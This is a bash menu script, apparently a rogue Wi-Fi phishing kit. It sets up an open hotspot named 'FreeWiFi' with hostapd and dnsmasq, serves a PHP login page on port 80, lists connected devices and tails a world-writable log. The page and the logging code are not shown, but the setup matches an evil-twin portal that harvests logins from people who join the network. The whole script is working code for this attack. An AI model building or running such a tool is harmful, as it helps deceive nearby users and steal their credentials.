#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"

# ---------------------------
# Detect Wi-Fi interfaces
# ---------------------------
detect_wifi_interfaces() {
    echo "[+] Detecting Wi-Fi interfaces..."
    mapfile -t INTERFACES < <(iw dev | awk '$1=="Interface"{print $2}')
    if [ ${#INTERFACES[@]} -eq 0 ]; then
        echo "[-] No Wi-Fi interfaces found!"
        exit 1
    fi

    echo "Available Wi-Fi interfaces:"
    for i in "${!INTERFACES[@]}"; do
        echo "$i) ${INTERFACES[$i]}"
    done

    read -p "Select interface for hotspot: " idx
    HOTSPOT_IFACE="${INTERFACES[$idx]}"
    echo "[+] Hotspot will use $HOTSPOT_IFACE"
}

# ---------------------------
# Setup folders/files
# ---------------------------
setup() {
    echo "[+] Setting up..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"
    sudo apt update
    sudo apt install hostapd dnsmasq php-cli -y
    echo "[+] Setup complete!"
}

# ---------------------------
# Create configs
# ---------------------------
create_configs() {
    HOSTAPD_CONF="/tmp/hostapd.conf"
    DNSMASQ_CONF="/tmp/dnsmasq.conf"

    cat > $HOSTAPD_CONF <<EOF
interface=$HOTSPOT_IFACE
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

    cat > $DNSMASQ_CONF <<EOF
interface=$HOTSPOT_IFACE
dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
EOF
}

# ---------------------------
# Start hotspot
# ---------------------------
start_hotspot() {
    echo "[+] Starting hotspot..."
    create_configs

    sudo ip link set $HOTSPOT_IFACE down
    sudo ip addr flush dev $HOTSPOT_IFACE
    sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
    sudo ip link set $HOTSPOT_IFACE up

    sudo hostapd $HOSTAPD_CONF -B
    sudo dnsmasq -C $DNSMASQ_CONF

    echo "[+] Hotspot started on $HOTSPOT_IFACE (Open, no password)"
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    sudo pkill hostapd
    sudo pkill dnsmasq
    echo "[+] Hotspot stopped."
}

# ---------------------------
# Start login page
# ---------------------------
start_server() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[-] Portal directory does not exist!"
        return
    fi
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:80
}

# ---------------------------
# Show connected devices
# ---------------------------
show_devices() {
    echo "[+] Connected devices (DHCP leases):"
    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
}

# ---------------------------
# Logs
# ---------------------------
view_logs() { cat "$LOG_FILE"; }
live_logs() { tail -f "$LOG_FILE"; }
edit_page() { nano "$PORTAL_DIR/index.html"; }

# ---------------------------
# Main Menu
# ---------------------------
while true; do
    echo ""
    echo "====== Wi-Fi Portal Tool ======"
    echo "1) Setup"
    echo "2) Select Hotspot Interface"
    echo "3) Start Hotspot"
    echo "4) Stop Hotspot"
    echo "5) Start Login Page"
    echo "6) Show Devices"
    echo "7) View Logs"
    echo "8) Live Logs"
    echo "9) Edit Page"
    echo "10) Exit"
    echo "=============================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) detect_wifi_interfaces ;;
        3) start_hotspot ;;
        4) stop_hotspot ;;
        5) start_server ;;
        6) show_devices ;;
        7) view_logs ;;
        8) live_logs ;;
        9) edit_page ;;
        10) exit ;;
        *) echo "Invalid option" ;;
    esac
done
